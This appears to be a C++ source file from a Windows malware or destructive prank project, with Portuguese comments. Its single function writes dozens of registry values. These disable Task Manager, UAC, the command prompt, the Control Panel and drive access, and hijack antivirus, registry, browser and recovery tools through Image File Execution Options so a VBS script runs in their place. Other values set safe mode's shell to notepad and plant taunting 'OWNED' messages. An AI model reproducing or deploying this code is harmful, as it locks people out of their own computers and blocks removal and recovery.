//#include "start.h"
#include "utils/utils.h"
#include "utils/reg.h"

namespace RegFuk {
    void Fuk() {
    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden",
        L"2",
        L"REG_DWORD"
    );

    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\HideFileExt",
        L"1",
        L"REG_DWORD"
    );

    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr",
        L"1",
        L"REG_DWORD"
    );

    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\TaskbarNoPinnedList",
        L"1",
        L"REG_DWORD"
    );

    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoPinningToTaskbar",
        L"1",
        L"REG_DWORD"
    );

    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoSetTaskbar",
        L"1",
        L"REG_DWORD"
    );

    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoTrayItemsDisplay",
        L"1",
        L"REG_DWORD"
    );

    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoTrayContextMenu",
        L"1",
        L"REG_DWORD"
    );

    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoSaveSettings",
        L"1",
        L"REG_DWORD"
    );

    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableLockWorkstation",
        L"1",
        L"REG_DWORD"
    );

    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA",
        L"0",
        L"REG_DWORD"
    );

    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoControlPanel",
        L"1",
        L"REG_DWORD"
    );

    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoStartMenuPinnedList",
        L"1",
        L"REG_DWORD"
    );

    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoStartMenuMFUprogramsList",
        L"1",
        L"REG_DWORD"
    );

    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoStartMenuMorePrograms",
        L"1",
        L"REG_DWORD"
    );

    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\HideFileExt",
        L"1",
        L"REG_DWORD"
    );

    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoFolderOptions",
        L"1",
        L"REG_DWORD"
    );

    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoFileAssociate",
        L"1",
        L"REG_DWORD"
    );

    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoRun",
        L"1",
        L"REG_DWORD"
    );

    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoFind",
        L"1",
        L"REG_DWORD"
    );

    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoSecurityTab",
        L"1",
        L"REG_DWORD"
    );

    Reg::Write(
        L"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoSecurityTab",
        L"1",
        L"REG_DWORD"
    );

    Reg::Write(
        L"HKCU\\Software\\Microsoft\\Command Processor\\DisableUNCCheck",
        L"1",
        L"REG_DWORD"
    );

    // partezinha daora

    Reg::Write(L"HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\AlternateShell",
        L"notepad.exe", // noescape tipo merda
        L"REG_SZ"
    );

    Reg::Write(L"HKLM\\System\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName\\ComputerName",
        L"#OWNED by HPPD", // lol
        L"REG_SZ"
    );

    Reg::Write(L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\legalnoticecaption",
        L"#OWNED by HPPD",
        L"REG_SZ"
    );

    Reg::Write(L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\legalnoticetext",
        L"Wow, seems that someone wants to escape from me, huh?\r\nWell, guess what? I'm back, bitch, watchugonnado now?",
        L"REG_SZ"
    );


    // secao original agora pq ss
    // em reusmo, essa prr fode com a logica d enumeros do windows
    // tipo, o 0123456789 vira qualquer lixo q eu quiser
    // mas só funciona em calculadora e excel AFAIK

    Reg::Write(
        L"HKCU\\Control Panel\\International\\sNativeDigits",
        L"𓂸𓂹𓂺𓂸𓂹𓂺𓂸𓂹𓂺𓂸",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKCU\\Control Panel\\International\\s1159",
        L"8==D",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKCU\\Control Panel\\International\\s2359",
        L"8==D",
        L"REG_SZ"
    );

    // mais regs skiddadas do bolbi! :DDDDD

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\msert.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mssecse.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\MSASCui.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\icacls.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\CCleaner.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\CCleaner32.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\CCleaner64.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\vbsedit.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\htaedit.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\VirtualBox.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mbam.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\uTorrent.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\uninstall.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad++.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\adwcleaner_5.005.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\student.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mmc.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\cmd.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\takeown.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\msconfig.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\regedit.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\regedit32.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\regedit33.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\attrib.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\install.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\setup.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\explorer.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\iexplore.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\chrome.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\firefox.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\installer.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\update.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\updater.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\plugin-hang-ui.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\wmic.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\control.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mdsched.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskhost.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\crashreporter.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableCMD",
        L"1",
        L"REG_DWORD"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autoruns.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procxp.exe\\Debugger",
        L"wscript.exe C:\\Users\\Public\\ghostroot\\Message.vbs",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoDrives",
        L"67108863",
        L"REG_DWORD"
    );

    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoDrives",
        L"67108863",
        L"REG_DWORD"
    );

    Reg::Write(
        L"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\RestrictRun",
        L"1",
        L"REG_DWORD"
    );

    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\RestrictRun",
        L"1",
        L"REG_DWORD"
    );

    // HKLM RestrictRun
    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\RestrictRun\\1",
        L"cscript.exe",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\RestrictRun\\2",
        L"wscript.exe",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\RestrictRun\\3",
        L"rpdbfk.exe",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\RestrictRun\\4",
        L"wmplayer.exe",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\RestrictRun\\5",
        L"explorer.exe",
        L"REG_SZ"
    );

    // HKCU RestrictRun
    Reg::Write(
        L"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\RestrictRun\\1",
        L"rpdbfk.exe",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\RestrictRun\\2",
        L"cscript.exe",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\RestrictRun\\3",
        L"wscript.exe",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\RestrictRun\\4",
        L"wmplayer.exe",
        L"REG_SZ"
    );

    Reg::Write(
        L"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\RestrictRun\\5",
        L"explorer.exe",
        L"REG_SZ"
    );
    }
}